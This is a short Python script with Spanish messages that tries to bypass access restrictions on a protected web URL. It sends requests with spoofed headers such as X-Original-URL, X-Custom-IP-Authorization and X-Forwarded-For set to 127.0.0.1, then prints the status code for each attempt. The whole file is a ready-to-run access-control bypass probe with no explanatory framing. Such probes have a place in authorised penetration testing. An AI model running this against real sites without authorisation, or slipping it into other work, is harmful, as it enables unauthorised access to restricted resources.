#!/usr/bin/env python3
import sys, requests

if len(sys.argv) != 2:
    print(f"Uso: {sys.argv[0]} https://target.com/protected")
    sys.exit(1)

url = sys.argv[1]
headers_list = [
    {"User-Agent": "Mozilla/5.0"},
    {"X-Original-URL": url},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"Referer": url},
]

for hdr in headers_list:
    r = requests.get(url, headers=hdr, allow_redirects=False)
    print(f"[{r.status_code}] con headers {hdr}")
